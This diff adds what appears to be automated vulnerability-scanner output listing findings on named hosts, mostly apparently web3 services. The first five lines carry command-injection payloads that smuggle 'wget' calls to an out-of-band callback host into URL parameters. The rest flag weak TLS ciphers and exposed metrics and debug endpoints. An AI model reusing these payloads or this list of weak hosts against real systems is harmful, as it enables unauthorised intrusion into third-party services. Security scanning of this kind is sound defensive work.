@@ -1,0 +1,31 @@
+[CVE-2014-3206] [http] [critical] https://identity-v1.fileverse.io/backupmgt/localJob.php?session=fail;wget+http://d9c55cdtsdp3ckgli8bgig539doxpseje.oast.online;
+[CVE-2014-3206] [http] [critical] https://identity-v1.fileverse.io/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d9c55cdtsdp3ckgli8bgobddubg3benjt.oast.online;
+[CVE-2017-9506] [http] [medium] https://identity-v1.fileverse.io/plugins/servlet/oauth/users/icon-uri?consumerUri=http://d9c55cdtsdp3ckgli8bghec73758scw9x.oast.online
+[CVE-2021-33544] [http] [high] https://identity-v1.fileverse.io//uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://d9c55cdtsdp3ckgli8bgfqwkbwywwjjaz.oast.online)&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything
+[CVE-2022-2488] [http] [critical] https://identity-v1.fileverse.io/cgi-bin/touchlist_sync.cgi?IP=;wget+http://d9c55cdtsdp3ckgli8bg566qsond9xhgx.oast.online;
+[weak-cipher-suites:tls-1.0] [ssl] [low] if.flaunch.gg:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] if.flaunch.gg:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] identity-v1.fileverse.io:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] identity-v1.fileverse.io:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] images.glow.app:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] images.hypurr.fi:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] images.glow.app:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] images.hypurr.fi:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] index-api.sequencer.mainnet.fuel.network:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] index-api.sequencer.testnet.fuel.network:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] index-api.sequencer.mainnet.fuel.network:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] index-api.sequencer.testnet.fuel.network:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] indexer.hypurr.fi:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] indexer.hypurr.fi:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] install.fuel.network:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] install.fuel.network:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] integrations.juice.finance:443 ["[tls10 TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] integrations.juice.finance:443 ["[tls11 TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA]"]
+[python-metrics] [http] [low] https://icrc-api.internetcomputer.org/metrics
+[kubernetes-metrics] [http] [low] https://icp-supply-api.internetcomputer.org/metrics
+[postgres-exporter-metrics] [http] [low] https://icp-supply-api.internetcomputer.org/metrics
+[prometheus-metrics] [http] [medium] https://icrc-api.internetcomputer.org/metrics
+[prometheus-metrics] [http] [medium] https://index-api.sequencer.mainnet.fuel.network/metrics
+[go-pprof-debug] [http] [low] https://influx.instadapp.io/debug/pprof/heap?debug=1
+[CVE-2019-11248] [http] [high] https://influx.instadapp.io/debug/pprof/
+[expired-ssl] [ssl] [low] insti-aida.gaib.ai:443 ["2026-03-15 06:36:16 +0000 UTC"]
